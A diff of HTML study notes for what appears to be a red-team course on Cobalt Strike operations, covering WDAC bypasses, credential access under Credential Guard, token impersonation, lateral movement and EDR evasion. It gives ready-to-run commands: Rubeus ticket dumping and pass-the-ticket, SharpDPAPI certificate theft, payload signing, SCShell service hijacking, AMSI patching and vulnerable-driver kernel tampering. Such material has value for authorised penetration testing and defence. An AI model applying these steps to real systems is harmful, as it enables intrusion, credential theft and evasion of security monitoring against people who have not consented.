+    <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1"> Check critical rule options:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1-0"> <code>Enabled:Audit Mode</code> &mdash; policy logs but does not block (easy bypass)</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1-1"> <code>Enabled:UMCI</code> &mdash; User Mode Code Integrity is enforced</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1-2"> <code>Enabled:Unsigned System Integrity Policy</code> &mdash; policy itself is unsigned (modifiable)</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1-3"> <code>Enabled:Dynamic Code Security</code> &mdash; blocks .NET/PS dynamic code generation</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-1-4"> <code>Enabled:Runtime FilePath Rule Protection</code> &mdash; enforces path-based rules</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-2"> Map the allowed execution surface:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-2-0"> List all trusted signers and their certificate chains</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-2-1"> List all allowed file hashes and file attributes</li>
+        <li><input type="checkbox" data-id="methodology-wdac-policy-analysis-wf-2-2"> Identify path-based rules and check if those paths are writable</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-wdac-bypass-techniques">11.7.2 Bypass Techniques</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-0"> File attribute spoofing via Artifact Kit:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-0-0"> Modify <code>resource.rc</code> to set <code>OriginalFilename</code> and <code>ProductName</code> to match an allowed binary</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-0-1"> Recompile the payload with the spoofed attributes</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-0-2"> Only works when the policy uses file attribute rules, not hash or signer rules</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-1"> Path wildcard abuse:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-1-0"> If the policy allows execution from a wildcard path (e.g., C:\\Windows\\*)</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-1-1"> Find a writable subdirectory within the allowed path</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-1-2"> Drop the payload there and execute</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-2"> Living-off-the-land binaries:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-2-0"> <code>Microsoft.Workflow.Compiler.exe</code> &mdash; compiles and executes C# from an XML input</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-2-1"> Only works when Dynamic Code Security is not enabled</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-2-2"> The binary is Microsoft-signed and typically allowed by WDAC policies</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># LOTL WDAC bypass — Microsoft.Workflow.Compiler.exe
+# payload.xml contains C# code to execute
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe payload.xml results.xml</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-3"> Electron application abuse:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-3-0"> Teams, VS Code, and other Electron apps have unsigned ASAR bundles</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-3-1"> Swap the JavaScript in the ASAR with your payload code</li>
+        <li><input type="checkbox" data-id="methodology-wdac-bypass-techniques-wf-3-2"> The signed Electron binary loads the modified ASAR without WDAC blocking</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://bohops.com/" target="_blank" rel="noopener noreferrer">Bohops WDAC research</a> &middot; <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener noreferrer">MITRE T1027 Obfuscation</a></p>
+
+<h4 id="methodology-wdac-code-signing">11.7.3 Code Signing</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-0"> Sign payloads with an obtained certificate:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-0-0"> <code>signtool.exe sign /f cert.pfx /p password /fd SHA256 payload.exe</code></li>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-0-1"> The certificate must chain to a trusted root in the WDAC policy</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Sign a payload with a code-signing certificate
+signtool.exe sign /f cert.pfx /p password /fd SHA256 /t http://timestamp.digicert.com payload.exe</code></pre>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-1"> Obtain a certificate from ADCS:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-1-0"> Find a certificate template with Domain Users enroll rights</li>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-1-1"> Request a code-signing certificate from the internal CA</li>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-1-2"> Use the issued cert to sign payloads &mdash; they will be trusted by the WDAC policy</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-2"> Supplemental policy injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-2-0"> Requires <code>Unsigned System Integrity Policy</code> + <code>Update Policy No Reboot</code> enabled</li>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-2-1"> Author a supplemental policy that allows your payload hash or signer</li>
+        <li><input type="checkbox" data-id="methodology-wdac-code-signing-wf-2-2"> Deploy it alongside the base policy &mdash; takes effect without reboot</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://bohops.com/" target="_blank" rel="noopener noreferrer">Bohops WDAC research</a> &middot; <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener noreferrer">MITRE T1027 Obfuscation</a></p>
+
+<h3 id="methodology-cred-access">11.8 Credential Access Under Protection</h3>
+<p>Credential Guard and PPL protect LSASS from direct memory access. Use alternative credential sources and Kerberos ticket operations to authenticate without dumping plaintext passwords.</p>
+<h4 id="methodology-cred-access-service-tickets">11.8.1 Service Ticket Extraction</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-0"> Enumerate available tickets:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-0-0"> <code>Rubeus triage</code> &mdash; list all cached Kerberos tickets by LUID</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-0-1"> Identify TGTs and service tickets for high-value targets</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-0-2"> Service tickets are NOT protected by Credential Guard</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-1"> Extract specific tickets:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-1-0"> <code>Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap</code> &mdash; dump a specific ticket by LUID and service</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-1-1"> Base64-encoded ticket can be used for pass-the-ticket</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-2"> Import and use tickets:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-2-0"> <code>Rubeus ptt /ticket:doIFqj...</code> &mdash; inject the ticket into the current session</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-2-1"> Access the target service using the imported ticket</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-3"> Request new service tickets via LSA:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-3-0"> <code>Rubeus asktgs /service:cifs/target.domain.com /luid:0x3e7</code></li>
+        <li><input type="checkbox" data-id="methodology-cred-access-service-tickets-wf-3-1"> Requests a new TGS using an existing TGT &mdash; does not touch LSASS memory</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Rubeus ticket workflow under Credential Guard
+Rubeus triage                                                    # list all cached tickets by LUID
+Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap                  # extract a specific ticket
+Rubeus ptt /ticket:doIFqj...                                     # inject ticket into current session
+Rubeus asktgs /service:cifs/fileserver.domain.com /luid:0x3e7    # request new service ticket via LSA</code></pre>
+
+<h4 id="methodology-cred-access-cert-auth">11.8.2 Certificate-Based Authentication</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-0"> Extract certificates with DPAPI:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-0-0"> <code>SharpDPAPI certificates /unprotect</code> &mdash; extract user certificates</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-0-1"> <code>SharpDPAPI certificates /machine</code> &mdash; extract machine certificates</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-0-2"> Outputs PEM-encoded certificates and private keys</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-1"> Convert to PFX for Kerberos auth:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-1-0"> <code>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-2"> Authenticate via PKINIT:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-2-0"> <code>Rubeus asktgt /user:target /domain:domain.com /certificate:cert.pfx /password:pass</code></li>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-2-1"> Returns a TGT for the certificate&rsquo;s identity &mdash; bypasses Credential Guard entirely</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-cert-auth-wf-2-2"> Works even when the user&rsquo;s password is unknown</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Certificate-based authentication — full chain
+SharpDPAPI certificates /unprotect                   # extract user certificates via DPAPI
+SharpDPAPI certificates /machine                     # extract machine certificates
+
+# Convert PEM to PFX for Kerberos auth
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+# Authenticate via PKINIT — bypasses Credential Guard
+Rubeus asktgt /user:admin /domain:domain.com /certificate:cert.pfx /password:pfxpass /nowrap</code></pre>
+
+<h4 id="methodology-cred-access-alt-sources">11.8.3 Alternative Credential Sources</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-0"> SAM database (local accounts):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-0-0"> Extract via registry save or volume shadow copy</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-0-1"> Crack NTLM hashes offline or use pass-the-hash</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-1"> Domain Cached Credentials (DCC2):
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-1-0"> Stored in the registry for offline domain logon</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-1-1"> Slow to crack (PBKDF2) but may yield domain creds on disconnected laptops</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-2"> Keylogging:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-2-0"> Deploy a keylogger to capture plaintext credentials as users type</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-2-1"> Target RDP sessions and password prompts</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-2-2"> Effective against Credential Guard since it captures input, not memory</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-3"> Third-party credential stores:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-3-0"> Browser saved passwords (Chrome, Edge, Firefox)</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-3-1"> Password managers (KeePass databases, LastPass agents)</li>
+        <li><input type="checkbox" data-id="methodology-cred-access-alt-sources-wf-3-2"> SSH keys, cloud credentials, VPN configs</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a></p>
+
+<h3 id="methodology-impersonation">11.9 User Impersonation</h3>
+<p>Assume the identity of other users through token manipulation and Kerberos ticket operations while maintaining OPSEC under EDR monitoring.</p>
+<h4 id="methodology-impersonation-token-ops">11.9.1 Token Operations</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-0"> Create a token with known credentials:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-0-0"> <code>make_token</code> &mdash; uses <code>LogonUserA</code> to create a network logon token (type 9)</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-0-1"> Creds are used for network authentication only &mdash; local commands still run as original user</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-0-2"> Blend with the legitimate binary: use it through a RunAs-style wrapper</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-1"> Create a sacrificial process for ticket injection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-1-0"> <code>Rubeus createnetonly /program:C:\\Windows\\System32\\cmd.exe /show:false</code></li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-1-1"> Uses <code>CreateProcessWithLogonW</code> &mdash; creates a new logon session</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-1-2"> Inject tickets into this session to impersonate without modifying your Beacon&rsquo;s token</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-2"> Steal a token from an existing process:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-2-0"> <code>steal_token [pid]</code> &mdash; duplicates the token from a running process</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-2-1"> Use OPSEC-safe APIs: open the process through syscalls with call stack spoofing</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-2-2"> Avoid opening high-integrity tokens unless necessary &mdash; handle operations trigger EDR</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-3"> Revert to original identity:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-3-0"> <code>rev2self</code> &mdash; drops the impersonated token and returns to the Beacon&rsquo;s original context</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-token-ops-wf-3-1"> Always revert before performing actions that should be attributed to the implant&rsquo;s service account</li>
+      </ul>
+    </li>
+  </ul>
+<pre><code class="language-bash"># Token operations workflow
+make_token DOMAIN\targetuser P@ssw0rd    # create network logon token (type 9)
+ls \\fileserver\c$                        # access network resources as targetuser
+rev2self                                  # revert to original Beacon identity
+
+# Alternative: steal from running process
+steal_token 4820                          # duplicate token from PID 4820
+ls \\dc01\c$                              # operate as that process's user
+rev2self                                  # revert
+
+# Sacrificial process for ticket injection
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
+# inject tickets into the new logon session</code></pre>
+
+<h4 id="methodology-impersonation-kerberos-edr">11.9.2 Kerberos Under EDR</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-0"> Ticket operations are still viable:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-0-0"> Dump tickets from memory and pass-the-ticket works regardless of EDR</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-0-1"> EDRs focus on LSASS access, not ticket parsing</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-0-2"> Use BOF-based ticket extraction to avoid fork-and-run detection</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-1"> Raw Kerberos traffic from non-LSASS is suspicious:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-1-0"> Tools that build AS-REQ/TGS-REQ from userland generate port-88 traffic from your process</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-1-1"> EDRs flag non-LSASS processes communicating on port 88</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-1-2"> Prefer injecting tickets into LSASS via PTT over building your own Kerberos packets</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-2"> OPSEC-safe Kerberos workflow:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-2-0"> Extract: BOF-based ticket dump from the current session</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-2-1"> Import: PTT into a sacrificial logon session</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-2-2"> Operate: use the imported ticket for network authentication</li>
+        <li><input type="checkbox" data-id="methodology-impersonation-kerberos-edr-wf-2-3"> Clean: purge tickets when done to avoid leaving evidence</li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a></p>
+
+<h3 id="methodology-lateral-movement">11.10 Lateral Movement</h3>
+<p>Move between hosts while maintaining evasion tradecraft. Every spawned Beacon must inherit the full evasion pipeline &mdash; loader, hooks, syscalls, and signature stripping.</p>
+<h4 id="methodology-lateral-movement-wmi">11.10.1 WMI</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-0"> Hook CoCreateInstance for OPSEC:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-0-0"> WMI lateral movement calls <code>CoCreateInstance</code> to create a remote WMI object</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-0-1"> Hook this API through PICO to add call stack spoofing</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-0-2"> EDRs monitor COM object creation for lateral movement patterns</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-1"> Stage the payload on the target:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-1-0"> Upload the payload to <code>C:\\Windows\\System32\\</code> or another system directory</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-1-1"> System directories are less suspicious than Temp or user profile paths</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-1-2"> Code-sign the payload if WDAC is enforced on the target</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-2"> Handle recently-created file detection:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-2-0"> Some EDRs flag files executed within seconds of creation</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-2-1"> Delay execution: upload first, wait, then trigger via WMI</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-wmi-wf-2-2"> Use a LOLBAS binary as an indirect launcher to break the creation-to-execution chain</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-lateral-movement-psexec-scshell">11.10.2 PsExec &amp; SCShell</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-0"> Avoid the default PsExec pattern:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-0-0"> UNC path in the service binPath is heavily signatured</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-0-1"> Upload the payload manually via SMB, then create a service with a local path</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-0-2"> Or use SCShell: hijack an existing service&rsquo;s <code>binPath</code> without creating a new service</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-1"> SCShell for OPSEC-safe service abuse:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-1-0"> Modify an existing stopped service to point to your payload</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-1-1"> Start the service, which executes the payload</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-1-2"> Restore the original binPath after execution</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-1-3"> No new service creation event &mdash; only a service modification</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-2"> Clean up service artifacts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-2-0"> Restore original service configuration</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-2-1"> Delete the uploaded payload</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-psexec-scshell-wf-2-2"> Verify no orphaned services remain</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-lateral-movement-beacon-tradecraft">11.10.3 Spawned Beacon Tradecraft</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-0"> Ensure spawned Beacons inherit evasion:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-0-0"> Use the <code>BEACON_RDLL_GENERATE_LOCAL</code> Aggressor hook</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-0-1"> This hook lets you apply the same Crystal Palace / PICO tradecraft to every new Beacon</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-0-2"> Without it, laterally-moved Beacons use the default (detectable) loader</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-1"> Code-sign the lateral movement payload:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-1-0"> Use the same code-signing certificate from the WDAC bypass phase</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-1-1"> Signed payloads bypass both WDAC and some EDR static-analysis checks</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-2"> Use LOLBAS for indirect execution:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-2-0"> Instead of directly executing the payload, use a legitimate binary as a launcher</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-2-1"> Examples: <code>rundll32.exe</code>, <code>regsvr32.exe</code>, <code>mshta.exe</code></li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-2-2"> Breaks the direct process-creation chain from the lateral movement tool</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-3"> Validate the full chain before operating:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-3-0"> Test lateral movement in a lab with the target EDR</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-3-1"> Confirm the spawned Beacon callbacks without alerts</li>
+        <li><input type="checkbox" data-id="methodology-lateral-movement-beacon-tradecraft-wf-3-2"> Verify the Beacon has full post-ex capability (sleep mask, BOFs, PICO hooks)</li>
+      </ul>
+    </li>
+  </ul>
+
+<h5>Evasion Layer Decision Table</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Detection Point</th>
+      <th>Technique</th>
+      <th>Implementation</th>
+      <th>OPSEC Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Disk (static sigs)</td>
+      <td>Signature removal + resource encryption</td>
+      <td>strrep_pad(), XOR masking, Crystal Palace PIC</td>
+      <td>Re-scan after every profile change</td>
+    </tr>
+    <tr>
+      <td>Load time (IAT, RWX)</td>
+      <td>Dynamic resolution + per-section permissions</td>
+      <td>DFR pattern, walk section headers post-load</td>
+      <td>No RWX pages should survive loader</td>
+    </tr>
+    <tr>
+      <td>API calls (user-mode hooks)</td>
+      <td>Direct/indirect syscalls + unhooking</td>
+      <td>RecycledGate, PICO hooks, clean ntdll overwrite</td>
+      <td>Combine with call stack spoofing</td>
+    </tr>
+    <tr>
+      <td>Call stack inspection</td>
+      <td>Synthetic frames + JOP gadget</td>
+      <td>Draugr, spoof_call(), RtlUserThreadStart frames</td>
+      <td>Validate under debugger before deployment</td>
+    </tr>
+    <tr>
+      <td>Memory scanning (sleep)</td>
+      <td>Encrypt PE sections during sleep</td>
+      <td>PICO Sleep hook, XOR/RC4, zero staging buffers</td>
+      <td>Keep active execution windows short</td>
+    </tr>
+    <tr>
+      <td>Post-ex telemetry</td>
+      <td>BOFs over fork-and-run, thread start spoofing</td>
+      <td>process-inject block, ObfSetThreadContext, AMSI patch</td>
+      <td>Strip all tool signatures before loading</td>
+    </tr>
+    <tr>
+      <td>Kernel telemetry</td>
+      <td>Callback removal, ETW-TI disable, PPL patch</td>
+      <td>Vulnerable driver (RTCore64, dbutil)</td>
+      <td>Driver load itself generates events &mdash; be fast</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://attack.mitre.org/techniques/T1021/" target="_blank" rel="noopener noreferrer">MITRE T1021 Remote Services</a></p>
+<h2 id="references">12. References</h2>
 <p>[1] R. Mudge, "Tradecraft Garden &mdash; Crystal Palace, BOFs, UDRLs, evasion components," [Online]. Available: <a href="https://www.tradecraftgarden.org/" target="_blank" rel="noopener noreferrer">https://www.tradecraftgarden.org/</a>.</p>
 <p>[2] Cobalt-Strike, "Sleep Mask Kit / BeaconGate / UDRL examples," HelpSystems. [Online]. Available: <a href="https://github.com/Cobalt-Strike" target="_blank" rel="noopener noreferrer">https://github.com/Cobalt-Strike</a>.</p>
 <p>[3] Zero-Point Security, "Red Team Ops II (CRTL)," [Online]. Available: <a href="https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii" target="_blank" rel="noopener noreferrer">https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii</a>.</p>
@@ -6481,8 +7613,7 @@ MIINX[...snip...]CCAA=</code></pre>
         </div>
       </div>
     </div>
-  </div>
-  <div class="section-flow-2">
+  </div><div class="section-flow-2">
     <button class="dropdown-btn">2. EDR Telemetry
       <i class="bi bi-caret-down-fill"></i>
     </button>
@@ -6520,8 +7651,7 @@ MIINX[...snip...]CCAA=</code></pre>
       </div>
       <a href="#crtl-edr-etw-ti">2.11 ETW-TI</a>
     </div>
-  </div>
-  <div class="section-flow-3">
+  </div><div class="section-flow-3">
     <button class="dropdown-btn">3. Load-Time Evasion
       <i class="bi bi-caret-down-fill"></i>
     </button>
@@ -6584,8 +7714,7 @@ MIINX[...snip...]CCAA=</code></pre>
         </div>
       </div>
     </div>
-  </div>
-  <div class="section-flow-4">
+  </div><div class="section-flow-4">
     <button class="dropdown-btn">4. Runtime Evasion
       <i class="bi bi-caret-down-fill"></i>
     </button>
@@ -6596,8 +7725,7 @@ MIINX[...snip...]CCAA=</code></pre>
       <a href="#crtl-runtime-memory-cleanup">4.4 Memory Cleanup</a>
       <a href="#crtl-runtime-control-flow-guard">4.5 Control Flow Guard</a>
     </div>
-  </div>
-  <div class="section-flow-5">
+  </div><div class="section-flow-5">
     <button class="dropdown-btn">5. Post-Exploitation Evasion
       <i class="bi bi-caret-down-fill"></i>
     </button>
@@ -6646,128 +7774,114 @@ MIINX[...snip...]CCAA=</code></pre>
       <a href="#crtl-postex-postex-signatures">5.24 Postex signatures</a>
       <a href="#crtl-postex-tool-signatures">5.25 Tool signatures</a>
     </div>
-  </div>
-  <div class="section-flow-6">
-    <button class="dropdown-btn">6. User Impersonation &amp; Lateral Movement
+  </div><div class="section-flow-6">
+    <button class="dropdown-btn">6. Kernel-Mode Bypasses 
       <i class="bi bi-caret-down-fill"></i>
     </button>
     <div class="dropdown-container">
+      <a href="#crtl-vulndrv-rtcore64">6.1 RTCore64</a>
       <div class="nested-dropdown">
-        <button class="nested-dropdown-btn">6.1 User Impersonation
+        <button class="nested-dropdown-btn">6.2 Driver BOFs
           <i class="bi bi-caret-down-fill"></i>
